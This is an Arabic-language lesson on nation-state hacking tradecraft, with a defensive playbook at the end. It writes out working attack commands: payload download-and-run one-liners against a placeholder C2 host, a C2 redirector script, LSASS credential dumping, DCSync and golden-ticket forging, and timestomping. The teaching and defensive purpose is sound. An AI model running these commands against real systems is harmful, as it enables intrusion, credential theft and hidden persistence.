# تكتيكات المجموعات المتقدمة (Nation-State Tradecraft)

ما يفرق بين الهواة والمشغلين المدعومين من الدول ليس مجرد استخدام الثغرات، بل هو **الاحتراف التقني (Tradecraft)**: كيفية تجهيز البنية التحتية، عزل العمليات عن بعضها، تضليل جهود الإسناد (Attribution)، والحفاظ على الوصول الهادئ لسنوات. يلخص هذا الدرس الدروس المستفادة من التقارير العامة لمجموعات مثل APT28، APT29، APT41، Lazarus، MuddyWater، Volt Typhoon، وSandworm.

![دورة حياة التهديدات المتقدمة](/images/lessons/apt_lifecycle_en.png)


> [!warning] استخبارات دفاعية
> استخدم هذه المعلومات لنمذجة الخصوم الحقيقيين (Adversary Modeling) ضد بيئتك. تكتيكات وأساليب وإجراءات (TTPs) المذكورة هنا موثقة من قبل وكالات وهيئات مثل CISA، Mandiant، Microsoft MSTIC، Volexity، وESET.

## الركائز الأربع للتكتيكات الحكومية

| الركيزة | التطبيق العملي |
|--------|--------------------------|
| **التجزئة (Compartmentalization)** | فرق عمل منفصلة، بنيات تحتية مستقلة، وثغرات مخصصة لكل هدف؛ حرق عملية واحدة لا يؤدي إلى انهيار المنظومة بالكامل. |
| **الصبر والأناة (Patience)** | متوسط وقت المكوث (Dwell time) للمجموعات المتقدمة يتجاوز 200 يوم. التحرك يتم فقط عند الضرورة القصوى. |
| **العيش على موارد النظام (Living off the Land)** | الاعتماد على أدوات نظام التشغيل الأصلية (LOLBAS) ليبدو النشاط كأنه سلوك إداري طبيعي لأنظمة EDR. |
| **الإنكار المقبول (Plausible Deniability)** | استخدام عمليات "العلم الكاذب" (False Flags)، إعادة استخدام أدوات إجرامية شائعة، والتنقل عبر خوادم وسيطة في دول ثالثة. |

## تجهيز البنية التحتية (Infrastructure Staging)

نادرًا ما يتصل المشغلون بالهدف مباشرة. السلسلة النموذجية للاتصال تكون كالتالي:

```
محطة عمل المشغل (Operator Workstation) ← مزود VPN ← وثبة المستوى الأول (Tier-1 Hop) ←
موجه المستوى الثاني (Tier-2 Redirector) ← خادم التحكم (C2 Server) ← الضحية
```

### المستوى الأول (Tier-1) — خوادم VPS مؤقتة

```terminal
# يتم شراؤها بالعملات الرقمية عبر وسطاء؛ ولا يتم استخدامها في أكثر من عملية واحدة.
# المزودون المفضلون في التقارير: Choopa/Vultr, DigitalOcean, IPVanish-tier, BulletProof.

# تحصين الإعدادات:
ufw default deny incoming
ufw allow from <REDIRECTOR_IP> to any port 443
sshd_config: Port 22222 / PasswordAuthentication no / AllowUsers ops
```

### المستوى الثاني (Tier-2) — موجهات تبدو شرعية

استغلال الخدمات السحابية الموثوقة لتختلط إشارات التحكم (Beacons) مع حركة المرور الطبيعية.

```terminal
# استخدام Cloudflare Worker كموجه — تقنيات Domain Fronting وتعديل الرؤوس (Headers)
wrangler init c2-redirect
# index.js
addEventListener('fetch', e => {
  const url = new URL(e.request.url);
  url.hostname = 'c2-real-host.tld';
  e.respondWith(fetch(url, e.request));
});

# استخدام Azure Front Door أو AWS CloudFront — مؤشرات SNI عالية الثقة
```

### اختيار النطاقات (Domain Selection)

- **النطاقات المعمرة (Aged Domains):** الاستحواذ على نطاقات منتهية الصلاحية عمرها سنتان أو أكثر لتجاوز فلاتر السمعة (Reputation Filters).
- **النطاقات المتشابهة (Lookalikes):** استخدام شهادات LE (Let's Encrypt) صالحة.
- **التصنيف الحميد:** استهداف النطاقات المصنفة كـ "حميدة" لدى Cisco Talos أو Symantec؛ يقوم المشغلون أحيانًا بطلب إعادة تصنيف النطاق قبل استخدامه الفعلي.

## التحكم القابل للتشكيل (Malleable C2)

تدعم أدوات مثل Cobalt Strike وSliver وMythic ملفات تعريف (Profiles) تشكل حركة مرور الشبكة لتبدو كأنها لتطبيقات شرعية مثل Slack أو Teams أو بروتوكولات Microsoft Office365.

```c
# Cobalt Strike Malleable C2 snippet — محاكاة لبيانات Office365
http-get "/v1/me/photo/$value" {
    client {
        header "User-Agent" "MSWAC";
        header "Authorization" "Bearer eyJ0eXAi...";
        metadata { netbios; base64url; uri-append; }
    }
    server {
        header "Content-Type" "image/jpeg";
        output { netbiosu; print; }
    }
}
```

> [!tip] استراتيجية الكشف المعكوس
> كمدافع، **ركز في قواعد الكشف على ملف التعريف (Profile) وليس البرمجية المزروعة (Implant)**. البرمجية تتغير في كل عملية، لكن ملف التعريف يترك بصمات نصية ثابتة (ترتيب الرؤوس، بصمة JA3، ونمط تأخير الإشارات).


![تنفيذ LOLBAS بالوكالة](/images/lessons/lolbas_proxy_execution_en.png)

## العيش على موارد النظام (LOLBAS / LOLBins)

لماذا تقوم بزرع ملفات ثنائية خارجية بينما يوفر نظام Windows كل ما تحتاجه؟

| الهدف | الملف الثنائي | مثال |
|------|--------|---------|
| تحميل وتنفيذ | `mshta.exe` | `mshta http://c2/x.hta` |
| تنفيذ بالوكالة | `rundll32.exe` | `rundll32 url.dll,OpenURL http://c2/x.dll` |
| سرقة الهويات (Cred Theft) | `comsvcs.dll` | `rundll32 comsvcs.dll, MiniDump <pid> lsass.dmp full` |
| التنقل الجانبي (Lateral) | `wmic.exe` / `PsExec` | `Invoke-Command -ComputerName SRV01 -ScriptBlock {...}` |
| الثبات (Persistence) | `schtasks` | مهمة مجدولة باسم `OneDriveStandalone` |
| الاستكشاف (Discovery) | `nltest`, `net` | حصر صلاحيات الـ Admins وعلاقات الثقة بالدومين |

```terminal
# استكشاف بأسلوب Volt Typhoon (اعتماد كامل على LOLBAS دون أدوات خارجية)
wmic /node:dc01 path win32_ntlogevent where "logfile='Security'" get /value
nltest /domain_trusts /all_trusts
net group "Domain Admins" /domain
quser /server:srv01
```

## تكتيكات الهوية والاعتمادات (Credential Tradecraft)

تعتمد المجموعات المتقدمة على سرقة الهويات لا على الثغرات البرمجية. مراحل التصعيد:

1. **الوصول الأولي:** عبر التصيد الاحتيالي (Phishing) أو ثغرات VPN.
2. **استخراج الذاكرة (Lsass Dump):** عبر comsvcs.dll للحصول على hashes الـ NT المحلية.
3. **مزامنة الدومين (DCSync):** استغلال حقوق النسخ الاحتياطي للحصول على ملف NTDS.dit بالكامل.
4. **التذكرة الذهبية (Golden Ticket):** استخدام hash الـ krbtgt لتزوير تذاكر Kerberos دائمة.
5. **اختراق الهوية الموحدة (Federation Backdoor):** تزوير رموز SAML (كما في هجوم Solorigate) للوصول للسحاب والأنظمة المحلية بمفتاح واحد.

```terminal
# DCSync (باستخدام Impacket)
secretsdump.py -dc-ip 10.0.0.1 corp.local/admin@dc01.corp.local -just-dc-user krbtgt
# المخرج: krbtgt:NTLM:aad3b435...:5e5a... ← تزوير التذاكر
ticketer.py -nthash <krbtgt-hash> -domain-sid S-1-5-21-... -domain corp.local Administrator
```

## الثبات على نطاق واسع (Persistence at Scale)

- **إساءة استخدام AD CS:** إصدار شهادات Smart Card لأي مستخدم (ثغرة ESC1) ← تجاوز دائم للمصادقة.
- **تزوير الاتحاد (Federation Forgery):** استبدال مفتاح توقيع SAML (مثل Solorigate / Magic Web).
- **إساءة استخدام Service Principal في Azure:** إضافة اعتمادات لتطبيقات موجودة بصلاحيات واسعة (مثل Mail.ReadWrite) لا تنتهي صلاحيتها.
- **برمجيات Firmware المزروعة:** استخدام UEFI bootkits (مثل LoJax, BlackLotus) التي تنجو حتى بعد إعادة تثبيت النظام.
- **اختراق أجهزة الحافة (Edge Devices):** استهداف أجهزة Cisco (BlackTech)، Fortinet (Coathanger)، وJuniper.

## أعلام كاذبة وتسميم الإسناد (False Flags)

أمثلة من الواقع:

- **Olympic Destroyer (2018):** تضمن نصوصًا برمجية تشير لمجموعة Lazarus لتضليل المحققين.
- **DarkHotel / TigerRAT:** أعادت استخدام أكواد من برمجيات إجرامية شائعة ليتم نسب الهجوم لجهات إجرامية بدلاً من حكومية.
- **Snake (Turla):** تستخدم لغات برمجية أو آثارًا (Artifacts) باللغة الروسية في بعض الحملات والإنجليزية في أخرى للتمويه.

> [!danger] الإسناد (Attribution) معقد، كن حذرًا
> تداخل الأكواد، الآثار اللغوية، وإعادة استخدام البنية التحتية كلها أمور يمكن تزويرها وزرعها. الإسناد القوي يتطلب استخبارات متعددة المصادر (SIGINT, HUMINT) وتحليلاً مالياً بالإضافة للتقني. يجب كتابة التقارير بصيغة "تكتيكات (TTPs) متسقة مع المجموعة X".

## الإيقاع العملياتي (Operational Tempo)

- **الاستطلاع (Recon):** يستمر لأسابيع أو أشهر، ويكون سلبياً بالكامل (Passive).
- **الاستغلال (Exploit):** يستغرق دقائق بمجرد تحديد الهدف.
- **الاستطلاع الداخلي والتنقل الجانبي:** أيام من العمل الهادئ والمتعمد؛ تجنب المسح الشامل المزعج.
- **الجمع (Collection):** يستمر لأسابيع، ويتم سحب البيانات المحددة في المهمة فقط.
- **التسريب (Exfil):** عبر قنوات منخفضة النطاق الترددي ومشفّرة، وغالباً ما تُجمع في خدمات سحابية شرعية (OneDrive, Dropbox) قبل السحب النهائي.
- **التنظيف (Cleanup):** مسح السجلات، التلاعب بالأختام الزمنية (Timestomping). العديد من العمليات الحكومية تترك وصولاً خلفياً (Backdoor) لسنوات دون الحاجة للتنظيف.

```terminal
# التلاعب بالختم الزمني لملف ليتطابق مع ملف نظام شرعي
SetMace.exe -p C:\windows\system32\drivers\srvnet.sys.bak -t "2019-12-07 03:21:14"
# أو عبر PowerShell:
(Get-Item C:\path\evil.sys).LastWriteTime = '2019-12-07 03:21:14'
```

## دليل الدفاع ضد التكتيكات الحكومية

1. **التقصي النشط لإساءة استخدام LOLBAS:** مراقبة عمليات `wmic process call create` و`rundll32` التي تحتوي على روابط، و`mshta` المنبثقة من عمليات غير متوقعة.
2. **كشف سرقة الهوية:** مراقبة فترات صلاحية تذاكر TGT غير الطبيعية، بصمات Golden Ticket، وتطبيقات OAuth ذات الأذونات النادرة.
3. **تقييد مسارات إدارة أجهزة الحافة:** فصل طبقة الإدارة (Management Plane) واستخدام محطات عمل مؤمنة (PAW).
4. **تحصين المستوى صفر (Tier 0 Hardening):** مراجعة قوالب ADCS، تدوير مفتاح krbtgt مرتين دورياً، وحفظ شهادات SAML في وحدات HSM.
5. **محاكاة الخصوم دورياً:** اختر تقريراً لمجموعة APT كل ربع سنة، وقم بمحاكاة سيناريو الهجوم في بيئتك لسد الفجوات المكتشفة.
